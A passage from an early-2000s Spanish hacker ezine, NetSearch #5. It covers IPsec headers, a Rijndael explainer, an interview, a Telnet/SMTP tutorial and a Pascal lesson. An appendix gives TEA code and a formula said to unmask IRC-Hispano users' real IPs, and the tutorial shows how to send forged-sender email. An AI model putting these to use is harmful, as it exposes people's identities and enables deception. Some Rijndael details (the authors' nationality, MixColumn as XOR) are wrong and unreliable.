-Payload data:Campo de longitud variable,contiene la parte encriptada del da-
tagrama y algunos datos suplementarios necesarios para el algoritmo de
encriptacion.

-Padding:La parte encriptada debe tener un tama¤o apropiado,asi k habra ke
rellenarla para ello (padding=relleno).

-Padding Lenght:Cuanto relleno se la ha a¤adido a los datos.

-Next Header: 8 bits,igual que en todas las cabeceras IPv6 indica el
protocolo de la cabecera siguiente,solo k aki no esta al principio

-Authentication data:ICV calculado en la cabecera ESP entera (excepto la
Authentication Data)es opcional (ver Authentication Header de la AH y nota
sobre el ICV arriba).

Como minimo se espera que la ESP soporte encriptacion DES y autentificacion
SHA-1 para cumplir con el estandar.


* 5 Notas finales
^^^^^^^^^^^^^^^^^^^

Weno pos nada algunas cosas se quedan en el tintero,como por ejemplo el ma-
nejo de llaves (protocolo de intercambio,algoritmos a usar,tiempo de vida,
longitud..etc)--para mas info mail me.-- :-))))

Espero que esta intro os sirva de algo :-))y no os parezca un rollo xDD. Si
alguien decide preguntarme algo puede hacerlo bien a mi particularmente
crazy_jm@worldonline.es // irc-hispano #netsearch o bien enviando un mail a
la lista de correo de NetSearch (preferible,para ser comentado por todos).

Un buen sitio para bajarse los RFC's es la peich de internic:www.internic.net
ke permite navegar por la lista comodamente o bien su server de ftp:ds.inter-
nic.net (get /rfc/rfc2373.txt).Aunke hay multitud de urls para ello. Dispongo
actualmente de una lista + o - completa de RFCs relacionados con el IPv6 si a
alguien le interesa mail me. Saludos a todos.


MegadetH



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x08 ]-==================================================================
=-[ NetSearch Ezine #5 ]-====================================================
=-[ Algoritmo Rijndael + IP Virtual ]-=======================================
=-[ por cafo ]-==============================================================




    Rijndael (o sobre como fastidiar al resto del mundo con una palabra)
   =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-


   Para no perder la costumbre de leer especificaciones sobre algoritmos
   criptograficos y dado que no he tenido tiempo de terminar la segunda
   parte del articulo de NetSearch #4 sobre heaps overflows, he pensado que
   no estaria de mas ver un poco por encima un sistema al que nos tendremos
   que acostumbrar dentro de bastante poco.

   Este articulo va a seguir basicamente los contenidos del documento
   pdf donde se dan las especificaciones del Rijndael, asi que no espereis
   un criptoanalisis muy sesudo.


1.- Se debe empezar fastidiando.
--------------------------------

  O eso debieron pensar Joan Daemen y Vincent Rijmen al elegir el nombre para
el algoritmo que iban a presentar al NIST para ser elegido posteriormente
como AES (Advanced Encription Standar, estandar de cifrado avanzado, el
sustituto del DES de toda la vida). El caso es que estos dos daneses han
sorprendido ganando un concurso en el que se presentaban competidores de
la talla de RSA y Counterpane (Bruce Sheiner para mas señas).

  Conceptualmente el Rijndael es un cifrador de bloque que acepta tamaños
de bloque de 128, 192 y 256 bits usando claves de tambien 128, 192 o 256 bits.
Segun reconocen los propios autores, el algoritmo esta influido directamente
en otro cifrador de bloques, el Square (a saber lo que significa "estar
influido directamente" ;) ).

  Como toda buena especificacion, se debe empezar por las bases matematicas
en las que se basa el algoritmo, para despues empezar a describirlo
detalladamente. Aviso que lo que viene es algebra cuasi-elemental (en el
sentido que es el tipo de algebra que se suele dar los primeros cursos
en los que hay una asignatura de algebra) y el que avisa no es traidor ;).

  A ver, un Campo de Galois (Galios Field, GF(), en lengua yanki) de un primo
'p' se define como el conjunto formado por todas las operaciones
* y +, ambas en modulo de p (mod p). Los elementos de cualquier conjunto
pueden ser representados de muchisimas maneras, desde la notacion
matematica y aseptica de los libros de analisis numerico hasta pintando
un circulito y dibujando cuadraditos como haciamos en EGB. Sea como sea,
se da el caso de que por cada potencia de un numero primo existe un unico
campo finito, y como estamos trabajando a nivel de byte (8 bits), todas
las representaciones que hagamos de GF(2^8) son isomorficas (es decir, que
la funcion q estemos usando es biyectiva: para cada valor del conjunto
inicial existe un valor unico en el final). Aprovechando estas propiedades,
los autores decidieron usar la tipica representacion en polinomios. Asi, cada
byte es representado por su polinomio unico. P.ej:

 El byte 01010111 (87 en decimal) se corresponde con el polinomio

        x^6 + x^4 + x^2 +x + 1

  Las operaciones en estos casos son las tipicas a las que un estudiante de
electronica esta acostumbrado ;). Para la suma se hace un XOR entre los
bits de los operandos. Para la multiplicacion se hace normalmente y despues
se aplica el teorema de Euclides (usando modulo X^8 + x^4 + x^3 + x + 1)
para que el resultado siga teniendo 8 bits.

  Esto es todo lo referente a los preliminares. Podria extenderme mas en el
algebra y en las representaciones usando vectores, pero la verdad es que es
un toston y tampoco tiene mucho sentido si no vamos a hacer un criptoanalisis
serio.


 2.- Especificaciones de diseño.
---------------------------------

  En el diseño del Rijndael se ha huido de usar las usuales estructuras de
Feistel (ver algun numero anterior del ezine) que se usan en muchos otro
algoritmos. Aqui, en vez de mover simplemente los bits de una posicion a otra
sin modificarlos, como es habitual en las redes de Feistel, se hace unas
transformaciones uniformes a todos y cada uno de los bits del bloque en cada
ronda. Esto de uniformes quiere decir que cada bit se trata de la misma
manera que a todos los demas, sin importar posicion, peso ni nada parecido.

  En esto se basa todo el algoritmo: se establecen tres niveles de
transformaciones con una serie de rondas en cada uno y la salida del ultimo
nivel es la salida del algoritmo. Concretamente los niveles son:

 - Nivel de mezclado lineal: Pues eso, se usan tecnicas lineales a traves de
     muchas rondas para mezclar los bits entre si.

 - Nivel no lineal: Se basa en la utilizacion de S-Box (funciones que
     reciben un byte y te devuelven otro segun una tabla interna) con
     propiedades no lineales.

 - Nivel de suma de clave: Esto se usa en la gran mayoria de los algoritmos
     actuales. Se trata de un XOR entre la clave de ronda y los bits de los
     otros estados.

  Como es usual en otros algoritmos, el ultimo nivel se ejecuta al
principio y al final de todo, porque un simple XOR es muy rapido y aumenta
considerablemente la seguridad del sistema. Tambien es de destacar que,
como en el DES, la ultima ronda del nivel de mezclado lineal es diferente
a las anteriores. La razon para eso... pues ni idea :).


 4.- Especificaciones de implementacion.
-----------------------------------------

  Vamos ya al meollo de la cuestion.

  El algoritmo usa la representacion matricial para el bloque y la clave.
Esto no es mas que coger los bytes del bloque y ponerlos en un array
de dos dimensiones. Concretamente, y como se usan tamaños de bloques
multiplos de 32, se ha decidido que los arrays tendran cuatro filas y tantas
columnas como hagan falta para hacer una matriz rectangular. Os haria un
dibujito pero es demasiado tarde para eso ;).

  Como ya hemos dicho, el algoritmo es simplemente una serie de rondas de
transformaciones entre los bits teniendo la ultima ronda distintas a las
demas. Me vais a permitir que use la denostada tecnica del cut&paste para
poner el pseudocodigo de las operaciones ;).


   Round(State,RoundKey)
   {
     ByteSub(State);
     ShiftRow(State);
     MixColumn(State);
     AddRoundKey(State,RoundKey);
   }

lo de arriba para las rondas normales y lo siguiente para la ultima:

   FinalRound(State,RoundKey)
   {
     ByteSub(State);
     ShiftRow(State);
     AddRoundKey(State,RoundKey);
   }


  Vamos por partes:

  * ByteSub: es el nivel no lineal del asunto. Aqui se usan las S-box no
             lineales de antes. Se construye con el multiplicativo
             inverso de GF(2^8) y se aplica una transformacion a fin de
             GF(2) definida por (c&p rulez!!):

           | y0 |   | 1 00 0 11 1 1 |   | x0 |   | 1 |
           | y1 |   | 1 10 0 01 1 1 |   | x1 |   | 1 |
           | y2 |   | 1 11 0 00 1 1 |   | x2 |   | 0 |
           | y3 |   | 1 11 1 00 0 1 |   | x3 |   | 0 |
           | y4 | = | 1 11 1 10 0 0 | * | x4 | + | 0 |
           | y5 |   | 0 11 1 11 0 0 |   | x5 |   | 1 |
           | y6 |   | 0 01 1 11 1 0 |   | x6 |   | 1 |
           | y7 |   | 0 00 1 11 1 1 |   | x7 |   | 0 |

             y? es el estado final despues de la operacion y x? el inicial.


  * ShiftRow: No creo que sea necesario explicar mucho, es solamente
              mover las filas de la matriz con diferentes offset.
              Estos offset dependen de la longitud del bloque.

  * MixColumn: Un poco mas complicado. Aqui las columnas del bloque son
               representadas como los polinomios de los que hablabamos antes
               y se multiplican en modulo x^4 + 1 (00010001) con otro
               polinomio predefinido que es:

                   c(x) =  '03' x^3 + '01' x^2 + '01' x + '02'

               '03','02' y '01' son coeficientes normales. Si alguien
               encuentra una razon logica para usar esos y no otros, que me lo
               explique ;). Bueno, bromas aparte, siendo a(x) el estado
               inicial y b(x) el estado final esta operacion se podria
               definir como b(x) = c(x) XOR a(x), o sea, un simple producto
               de matrices:

              | b0 |   | 02 03 01 01 |   | a0 |
              | b1 |   | 01 02 03 01 |   | a1 |
              | b2 | = | 01 01 02 03 | * | a2 |
              | b3 |   | 03 01 01 02 |   | a3 |

               Solo se usan cuatro bits porque, como dijimos antes, el bloque
               se representa como una matriz cuadrada de 4 filas.

  * AddRoundKey: Como hemos dicho antes, esto solo es el XOR entre los bits
                 del bloque y la clave de esta ronda. Mas abajo viene como
                 sacar dicha clave.

 
  El tratamiento de la clave se basa en 2 componentes: expansion de la clave
de cifrado y la seleccion de la clave de ronda. De manera simple se puede
explicar esto como:

 1.- El numero total de bits de la clave de ronda es igual al numero de bits
     del bloque multiplicado por el numero de rondas mas 1. Por ejemplo, para
     un bloqe de 128 bits y 10 rondas, se necesitan 128 * 11 = 1408 bits.

 2.- Expansion de la clave de cifrado.

 3.- La seleccion de la clave de cada ronda es simple: se coge la clave
     expandida y se toman N bits (con N siendo la longitud de las filas del
     bloque), para la segunda se toman los siguientes N bits y asi
     sucesivamente.

  Como la expansion de la clave es simplemente una funcion matematica, no
me voy a poner a explicarla. Simplemente la pego ahi abajo para el que tenga
interes en seguirla (y para hacer bulto, para que negarlo ;) ):

 Si el numero de columnas de la matriz de la clave es <= 6:

 KeyExpansion(byte Key[4*Nk] word W[Nb*(Nr+1)])
 {
   for(i = 0; i < Nk; i++)
      W[i] = (Key[4*i],Key[4*i+1],Key[4*i+2],Key[4*i+3]);
   for(i = Nk; i < Nb * (Nr + 1); i++)
   {
      temp = W[i - 1];
      if (i % Nk == 0)
      temp = SubByte(RotByte(temp)) ^Rcon[i / Nk];
      W[i] = W[i - Nk] ^temp;
   }
 }

 Si es mayor:

 KeyExpansion(byte Key[4*Nk] word W[Nb*(Nr+1)])
 {
   for(i = 0; i < Nk; i++)
      W[i] = (key[4*i],key[4*i+1],key[4*i+2],key[4*i+3]);
   for(i = Nk; i < Nb * (Nr + 1); i++)
   {
      temp = W[i - 1];
      if (i % Nk == 0)
         temp = SubByte(RotByte(temp)) ^Rcon[i / Nk];
      else if (i % Nk == 4)
         temp = SubByte(temp);
      W[i] = W[i - Nk] ^temp;
   }
 }


  Si alguien tiene alguna duda sobre lo que significa esto, que pregunte o
que se vaya a la pagina del NIST y se coja el documento del Rijndael ;).

  Pues listo, este algoritmo ya no va a dar mas de si. Esta basicamente
explicado y solo hay que decir que es bastante simple, y por lo tanto,
facil de implementar en CPU's, smartcards y demas (que por otra parte para
eso se penso).

Mas info sobre el tema:

http://csrc.nist.gov/encryption/aes/

y a partir de ahi, seguid los enlaces ;)



=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

  APENDICE.

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-



  Esto no tiene nada que ver con el Rijndael, pero como todavia hay gente
a la que le pica la curiosidad, pues lo pongo.

  Parece mentira que todavia haya gente que pregunte como se pueden
averiguar las IP's reales a partir de las IP's virtuales del IRC-Hispano.
Bueno, ya que insisten, les dare una forma de fuerza bruta para hacerlo;
ahora bien, el que se haga viejo intentandolo, que se fastidie y no haberme
echo caso ;)

  El sistema que se usa es el siguiente:

  - Se coge la IP real del individuo y tomando un vector 'v' y una clave 'k'
    que cambia periodicamente, se hace pasar por el algoritmo TEA
    (Tiny Encription Algorithm).

  - La salida se transforma a Radix64 y se mira si alguno de los caracteres
    de salida es incompatible con el sistema DNS. Si es asi, se coge un valor
    de 'v' diferente y se vuelve a hacer la operacion. Aunque parezca q esto
    es muy lento, estadisticamente se demuestra que cada 1.3 veces se
    consigue un valor valido, asi que esta muy bien.

  - Como tenemos 64 bits, se parten en dos mitades de 32 y se le añade la
    cadena ".virtual".

  Y ya tenemos la IP virtual.

  El algoritmo TEA es un cifrador de bloques de 64 bits (como el DES) que
usa claves de 128 bits, pero con la particularidad de que en el Hispano, solo
se usan 64 (poniendo los 64 primeros a 0). El TEA es muy simple y en
pocas lineas esta implementado. Concretamente para ANSI C la funcion de
cifrado es:


void encipher(const unsigned long *const v,unsigned long *const w,
   const unsigned long * const k)
{
   register unsigned long       y=v[0],z=v[1],sum=0,delta=0x9E3779B9,
                                a=k[0],b=k[1],c=k[2],d=k[3],n=32;

   while(n-->0)
   {
       sum += delta;
       y += (z << 4)+a ^z+sum ^(z >> 5)+b;
       z += (y << 4)+c ^y+sum ^(y >> 5)+d;
   }
   w[0]=y; w[1]=z;
}

siendo 'w[0]' y 'w[1]' donde se devuelve el valor del cifrado.

  La funcion de descifrado es parecida (y es la que se debe usar para sacar
la ip real):


void decipher(const unsigned long *const v,unsigned long *const w,
   const unsigned long * const k)
{
      register unsigned long       y=v[0],z=v[1],sum=0xC6EF3720,
                                   delta=0x9E3779B9,a=k[0],b=k[1],
                                   c=k[2],d=k[3],n=32;

      /* sum = delta<<5, in general sum = delta * n */

      while(n-->0)
      {
            z -= (y << 4)+c ^y+sum ^(y >> 5)+d;
            y -= (z << 4)+a ^z+sum ^(z >> 5)+b;
            sum -= delta;
      }
      w[0]=y; w[1]=z;
}


  Y listo. Solo teneis que saber que en concreto, en el Hispano, se usa la
funcion de cifrado como:

  VIRTUAL = TEA( clave, ip<<32 + (clave>>32)&0xffff0000 + n)

  Ale, a divertise ;)


un saludete.
cafo.

cafo@netsearch-ezine.com



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x09 ]-==================================================================
=-[ NetSearch Ezine #5 ]-====================================================
=-[ En contacto con Guybrush ]-==============================================
=-[ por NetSearch ]-=========================================================




             +-----
             |                  |                    |
             |                  |               +--  |
             |   --+  |  | \ |  |--+  |/  |  |  |__  |__
             |     |  |  |  \|  |  |  |   |  |    |  |  |
             +-----+  +--+   |  +--+  |   +--+  --+  |  |
   	  . . . . . . . . . . . . . . . . . . . . . . . . . . 




Para esta seccion en este NS #5  hemos contactado con Guybrush
(guybrush@iname.com). Como muchos sabreis Guybrush es/era uno de los 
pilares fundamentales del Ezine de origen mexicano RareGaZz
(http:/dkch.net/raregazz/).

Por desgracia durante el transcurso de la entrevista nos ha comentado que el
futuro de RareGaZz es incierto.. La verdad es que es una pena porque desde
siempre fue una de las mejores Ezines en castellano, 17 numeros a sus
espaldas lo confirman.

En fin, aqui os dejo con la entrevista, vamos a conocer un poco mas a fondo a
este elemento del underground hispano ;)..
 
(La entrevista en concreto fue realizada por RaiSe)


### Log session started at Mon Jan 8 23:44:27 2001 ###


<RaiSe> bueno, ya esta, ya podemos ponernos a ello :)

<Guybrush> pregunta ...

<RaiSe> cuentame lo + apoximado posible una breve descripcion
        sobre ti, ciudad, edad, estudias/trabajas..

<Guybrush> españa, por el este, ingeniero tecnico informatico, mi curro es de
           administrador de AS400 y NT, aunque tengo
           pluriempleo como programador de CGIs en Linux.

<RaiSe> ahap, el este q es a la izquierda o la derecha? XD, es coña..  
<RaiSe> y bueno.. cuentame un poco como empezaste en esto de los
        ordenadores.. como fue tu primer contacto con internet, y + tarde con
        el underground y esas cosas..

<Guybrush> :)
<Guybrush> pues aunque suene a topico, comence a los 12 años mas o
           menos con un CPC464 ... me canse de jugar y comence a realizar mis
           propios juegos y a hacer mis pinitos en Z80 (ASM). Luego comence
           en la Universidad y hace unos 6 años descubir la red.

<RaiSe> tu edad aproximada se puede saber?..

<Guybrush> cerca de 30.

<RaiSe> y como empezaste con lo de raregazz?

<Guybrush> comence en internet casi como todo el mundo, bueno, primero entre
           en infovia (sobre todo IRC), luego Internet (tb IRC) y comence a
           tener amigos raros :)  ... fui descubriendo paginas interesantes y
           dado que yo estudiaba informatica me fue algo mas facil entender
           ciertas cosas asi que me puse a preguntar mis dudas a estos grupos
           de hackers.

<Guybrush> Rare fue un grupo que respondia a todas mis dudas y me ayudo
           bastante, asi que les envie un par de textos y ... me los
           publicaron ... a los pocos meses raretrip me propuso entrar en el
           team.

<RaiSe> que sueles hacer en tu tiempo libre?

<Guybrush> jejeje ... yo no tengo tiempo libre..

<RaiSe> jeje, pues q te gustaria hacer si lo tuvieras? :)

<Guybrush> pues me gustaria poder dedicar mas tiempo a investigar cosas
           nuevas como exploits, poder realizar algun programa interesante, o
           simplemente dominar mas a fondo algun sistema operativo.

<RaiSe> ahap, y en que gastarias tu tiempo libre y que no tenga nada q ver
        con ordenadores? :)

<Guybrush> si no hubieran ordenadores me habria dedicado al deporte. Me
           gustan los deportes individuales y de riesgo (artes marciales,
           alpinismo, windsurf, motocross, etc).

<RaiSe> te gusta la musica?

<Guybrush> me gusta la musica pop y rock no demasiado duro ... tb algo de
           musica alternativa.

<Guybrush> si quieres te dare una primicia ...

<RaiSe> oki, dime :)

<Guybrush> ya no estoy en rare ... ni tampoco raretrip. raretrip volvio ...
           aparece en el ultimo ezine, pero ambos lo hemos dejado por
           ... diferencias con el resto.

<RaiSe> pues es una pena.. y como es q estuvisteis tanto tiempo sin sacar
        rare17?.. y la perdida del dominio y eso?.. :?

<Guybrush> el subdominio de acapulco lo perdimos porque parece que ese
           dominio ha desaparecido ... no se que rayos ha pasado y he perdido
           el contacto con los admins. Luego tardamos porque reuni un nuevo
           team y mientras nos organizabamos y la gente se decidia a
           colaborar ... paso algun tiempo. Resulta que la gente de ahora es
           demasiado cool y nada mas que quiere ser conocido y pertenecer a
           un grupo bueno pero nadie quiere trabajar ...

<RaiSe> y tambien perdisteis la pagina web?.. lo digo pq estaba muy guapa..
        mucha info y eso..

<Guybrush> ahora hay una nueva web, pero supongo que raregazz ha muerto.
           nadie tiene ganas de trabajar, como te he dicho, tan solo quieren
           aparentar pero ninguno hace nada. Sin embargo, quieren tomar
           decisiones y mandar pero sin hacer nada a cambio ... despues de
           dar varios años a algo en lo que creia ... lo he tirado todo por
           la borda.

<RaiSe> y el antiguo team?..

<Guybrush> ni idea ... tan solo tengo relacion con raretrip.

<RaiSe> entonces das una mala noticia.. ya es definitivo entonces?..

<Guybrush> eso de mala notica es para algunos ... apuesto a que muchos se
           alegran. Si, es totalmente definitivo ... NUNCA volvere a formar
           parte de raregazz. De todas formas llevar un grupo es muy
           sacrificado ... la gente nada mas que sabe criticar..

<RaiSe> y que proyectos de futuro tienes en mente?..

<Guybrush> futuro? pues profesionalmente quiero invertir en internet
           (estoy haciendo algunos programas y voy a montar un servidor)
           y como usuario ... nose. Tal vez despues de un tiempo realice
           nuevos proyectos ...

<RaiSe> otra pregunta tipica: que opinas del panorama del hacking/seguridad
        español? del panorama actual.. y de un futuro a corto plazo..

<Guybrush> la verdad es que me gusta poder ayudar a aquellos que comienzan.
           Se que no soy elite y .... tal y como son todos los que conozco,
           no quiero serlo. Tan solo soy un informatico curioso al que le
           gusta poner a disposicion del que lo desee todas aquellas cosas
           que aprendo. Panorama español? la verdad es que ando algo
           desconectado pero pienso que ha decaido un poco. Esto es una moda
           como todo y creo que el fuerte del hacking paso hace unos pocos
           años. Pero la gente que aun sigue cada dia alcanza un mejor nivel,
           obviamente. Ademas, cada vez mejoran los sistemas y es mas dificil
           encontrar fallos y los exploits son cada dia mas sofisticados
           ... en España hay muy buenos hackers (entre los que yo no me
           incluyo) ... pero es una lastima que se lo guarden todo para ellos
           y que no enseñen nada a los demas.

<RaiSe> que grupos españoles crees q estan + 'en la onda'?.. (lo siento pero
        no se me ocurria como formular esta pregunta jeje).

<Guybrush> a mi personalmente los que mas me gustan son SET (por cierto,
           aprovecho para saludar a mi gran amigo +NetBul :) y Mentes
           Inquietas. Como persona admiro mucho a Jesus Cea y a Jordi
           (Savage).

<RaiSe> Bueno, pues como no se q + preguntar yo creo q damos x terminada la
        entrevista.. :), ha quedado un poco corta pero bueno..

<Guybrush> :)

<RaiSe> Venga, pues ha sido un placer, que te vaya muy bien en tus nuevos
        proyectos, nos vemoss.

<Guybrush> Igualmente, gracias.


### Log session terminated at Tue Jan 9 01:02:07 2001 ###


Pues nada.. solo me queda como es costumbre darle las gracias desde aqui por
darnos la oportunidad de conocerlo un poco mejor ;). Todo el staff de
NetSearch le desea lo mejor en sus nuevas andanduras.. Un saludo.



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x10 ]-==================================================================
=-[ NetSearch Ezine #5 ]-====================================================
=-[ Breves de NetSearch ]-===================================================
=-[ por Varios Autores ]-====================================================




----

 + Indice Articulos:

   1.- Telnet (por RomLi).
   2.- Curso de Pascal [3] (por Papa Pile).

----



En este numero del ezine estrenamos nueva seccion cuyo nombre como podreis
comprobar es 'Breves de NetSearch'. Aqui se incluiran textos que, por su
brevedad, no seran publicados como 'articulos completos'. Es decir, no
apareceran en el indice (0x00) ni iran en ficheros separados (una vez que se
ejecute nextract -s obviamente). La razon no es que sean de baja calidad,
sino que simplemente tienen una brevedad excesiva. Para hacernos una idea
(salvo excepciones) cualquier txt que no supere los 8k sera incluido en esta
seccion.

Tambien se incluira algun que otro articulo de nivel bajo/medio, ya que
creemos que en el ezine tiene que haber un poco de todo, y los articulos de
nivel bajo para la gente que esta empezando no son una excepcion. Asi que ya
sabes, si estabas pensando en escribir un mini-articulo sobre temas como por
ejemplo:


. Estructura de directorios en *nix.
. Comandos basicos de *nix.
. Uso del netcat.
. Uso de remailers.
. etc.


Y no sabias donde mandarlo: editor@netsearch-ezine.com rulez ;). Bueno,
y despues de esta pequeña introduccion aqui teneis los artis de este
numero..



==[ Telnet ]=================================================================
==[ por RomLi ]==============================================================


Hi lectores, este es el primer articulo que escribo a NetSearch, voy a
explicar sobre Telnet y explicarlo bien, algo asi como para "Torpes" de todas
formas tambien explico como manejar los protocolos POP3 y SMTP para usar el
correo.

¿QUE ES TELNET?

Telnet es el protocolo de conexion entre ordenadores, de hecho la mayoria de
los servicios, se basan en Telnet (por ejemplo FTP o HTTP...). Cuando un
ordenador se conecta mediante protocolo Telnet a otro ordenador remoto, los
programas se ejecutan sobre este ultimo, recibiendo el primero la
entrada-salida de los datos, algo asi como si estas sentado con la maquina
del otro lado, pero no te creas que puedes ir como pedro por la casa.

¿COMO SE HACE TELNET?

Haciendo Telnet a la maquina y puerto correspondientes segun cada caso. Por
ejemplo si queremos utilizar el servicio POP3 de nuestro ISP para ver el
correo que tenemos, haremos Telnet a la maquina POP3 por el puerto de este
protocolo, el 110. Tambien podemos consultar grandes bases de datos e incluso
acceder a servicios GHOPER o WWW, muy util si no tenemos acceso a estos
servicios por la via normal, en este caso voy a explicar el uso de los
protocolos POP3 y SMTP.

POP3 ---> Post Office Protocol

Bueno, vamos a usar el Telnet que trae el Windows por defecto, Inicio /
Ejecutar / y ponemos Telnet. En el programita que nos sale nos vamos al menu
Terminal ---> Preferencias. Aqui marcamos Eco Local y Cursor Intermitente (lo
de Eco Local es para ver lo que escribimos y lo de Cursor Intermitente es
para que te parpadee el cursor). Lo demas lo dejamos como esta. Pulsamos
Aceptar y nos vamos al menu Conectar ---> Sistema remoto. En Nombre de host
escribimos la direccion de nuestro servidor POP3 como puede ser
pop3.puticlub.com y en Puerto escribimo 110 porque es el puerto del protocolo
POP3. Pulsamos conectar y esperamos un poquillo hasta que el servidor nos
responda. Ahora solo nos queda:

1- Tecleamos "user tu_login". Ejemplo: user Fulanita. Nos confirmara el
comando.

2- Ahora la password, tecleamos pass contraseña. Ejemplo: pass yeah250H. Nos
confirmara otra vez.

3- Ahora ya estamos dentro del servidos POP3, para ver la lista de mensajes
que tenemos tecleamos list y nos dara la lista junto a dos numeros. Uno es el
numero de mensaje y el otro el tamaño.

4- Si queremos leer uno ponemos top numero_mensaje tamaño. Ejemplo: top 24
1452. Si el mensaje es largo no nos dara tiempo a verlo entero. Para esto lo
mejor es ir a Terminal ---> Iniciar registro e indicar un directorio y nombre
del *.log . Todo lo que se visualice en pantalla a partir de ahora se
guardara en ese archivo y podras leerlo mas tarde.

5.- Para borrar un mensaje ponemos dele numero_mensaje. Ejemplo: dele 5, que
yo sepa, no es posible borrar todos los mensajes a la primera, pos dele 1
dele 2 dele 3...

A mi una vez, en una lista de correos me mandaron un Bug del Outlook, ese que
al recibirlo el Outlook se te cerraba de golpe, entonces como me parecia raro
que siempre se cerraba en el mensaje 5... ya podeis ir pensando lo que hice
;-).

SMTP ---> Simple Mail Transfer Protocol

Aqui tambien usamos el telnet del windows pero puedes usar en todos los casos
el que programo Pepe soplillo ;-D.

Pues todo igual que antes pero ahora en Conectar ---> Sistema remoto --->
Nombre de host: escribimos la direccion de nuestro servidor SMTP como puede
ser smtp.puticlub.com y en Puerto escribimo 25, en este caso el 25 es del
SMTP y el 110 del POP3, acuerdate :-). Pulsamos conectar y esperamos a que el
servidor nos responda, sino responde vete a www.playboy.com pa que te
responda con un "Yas toi preparaooo" y asi no te da tiempo de ver la playmate
del mes XDD.

Con el SMTP podemos enviar mail, falsos si quieres, el SMTP no nos pide user
ni pass. Yo tambien hice una putada de esas con mail falso, solo por probar,
se lo hice a mi hermana, mande un mail de un tio que me invente @ una
universidad, jeje, pos mi hna flipo pensando en ese nombre que puse XDD, ahh
y si tu victima no es tonta o korki como dice un gili de los mios, pues que
viendo la IP (Internet Protocol) saben que es broma ya que la IP es de
puticlub.com. Vamos a ver como se hace...

1.- Escribimos mail from:tu_mail_(puede ser falso). Ejemplo: mail
from:fulanita@puticlub.com, como vemos, este mail es falso y como ya dije que
si la victima no es tonto/a se entera por la IP.
 
2.- Escribimos rcpt to:mail_destinatario. Nada de cosas falsas aqui sino
quieres que no le llegue.

3.- Escribimos data, le damos al intro y empezamos a escribir el mail, cuando
quieramos finalizar, bajamos a una linea libre, ponemos un punto y bajamos a
otra, asi.

.  <-----

Por cierto, cada servidor nos respondera a su forma, quiero decir que algunos
nos da la bienvenidas y otros no das por culo y esas cosas :-) y tambien las
direcciones de los servidores POP3 y SMTP pueden ser otras pero casi siempre
son POP3/SMTP.servidor.es-com-org, ahh que se me olvidaba, en ambos sevidores
(POP3 / SMTP) para salir usamos el comando quit.

Nada mas, un saludo a todos los lectores del E-Netsearch 5.


+-+-+-+-+-+-+-+-+-+
-----RomLi--------+
romli@eresmas.com-+
+-+-+-+-+-+-+-+-+-+


 -__-__-__-__-__-__-__-__-__-__-__-__-__-__-__-__-__-__-__-__-__-__-__-__-__
 
 
==[ Curso de Pascal [3] ]====================================================
==[ por Papa Pile ]==========================================================


hiZ!

Mi nombre es Papa Pile. Aunque pueda parecer increible este nick se me
ocurrio cuando tenia tan solo 1 año. Algun dia os contare como ocurrio.

Pero ahora vayamos al grano. NetSearch comenzo de la mano de Dark_FeaR un
curso de Pascal que merece la pena continuar. Este curso acabo en el numero
3 con los arrays y los registros. Es hora de avanzar y hablar de los
subprogramas.

Funciones y procedimientos.

Cuando comenzo el curso de Pascal, Dark_FeaR ya comento que el objetivo era
entre otras cosas adquirir buenas costumbres a la hora de programar. Las
funciones y los procedimientos cumplen un papel fundamental a la hora de que
nuestro codigo sea claro. Es importante que el resto de programadores de la
comunidad entiendan lo que hemos hecho. Ademas las funciones y los
procedimientos ( tambien llamados subprogramas ) nos permiten llevar a cabo
nuevos metodos de programacion mas eficaces y veloces ( como por ejemplo la
recursividad que trataremos en el proximo numero ).

En que consisten los subprogramas ? Pues son bloques de codigo que realizan
una accion concreta. Por ejemplo, en cualquier programa se producen errores,
por lo tanto, es conveniente tener una funcion o un procedimiento que los
trate. Como cualquier gran programa se compone de multitud de "acciones
concretas" deberemos de tratar de que nuestro programa principal contenga
basicamente llamadas a los subprogramas, ademas de lo imprescindible. Por
ejemplo, si tenemos que pedirle algo al usuario, que sea dentro de un
subprograma, si tenemos que hacer algun calculo, que sea dentro de un
subprograma, etc.

En que se diferencian las funciones de los procedimientos ? Pues existe una
gran diferencia. Las funciones *devuelven* al programa principal un valor de
tipo simple. Y hay que añadir que solo devuelve un valor. Una funcion no
puede devolver mas de un valor. En cambio los procedimientos pueden devolver
mas de un valor y ademas de cualquier tipo. Tal vez los que se esten
iniciando en el mundo de la programacion se pregunten a que me refiero con
"devolver". Me refiero a que una funcion siempre tiene un resultado y ese
resultado se pasa al programa principal para que sea utilizado en otras
funciones o en el propio programa principal. Si volvemos al ejemplo del
subprograma que trata los errores, estareis de acuerdo que podria tratarse
como una funcion que devuelve un boolean ( para mas informacion sobre los
tipos de datos consultar netsearch #1 ) TRUE si hay error y FALSE si no lo
hay.

Ahora viene la parte mas practica. La implementacion. Como podemos utilizar
las funciones y los procedimientos en nuestros programas ? Veamoslo en un
esquema:

program esquema;
        const
                identificador:valor;
        var
                identificador:tipo_base;

        { A partir de aqui colocariamos nuestros subprogramas, al acabarlos
        simplemente comenzariamos con el programa principal }

        begin
                { programa principal incluyendo las llamadas a los
                subprogramas}
        end;

A continuacion muestro la forma que tienen los subprogramas que colocamos en
lo que llamamos bloque de declaracion de subprogramas ( despues de las
variables y antes del programa principal )

function ejemplo ( identificador1:tipo_base; identificador:tipo_base ):
tipo_base
        const
                identificador:valor;
        var
                identificador:tipo_base;
        begin
                { cuerpo del subprograma }
        end; { atencion: los subprogramas acaban con end; y no end. }

Que quiere todo esto ? Pues lo que hay en la primera linea entre parentesis
son los parametros de entrada. Son las variables que en este caso la funcion
necesitara que le envien desde el programa principal para llevar a cabo
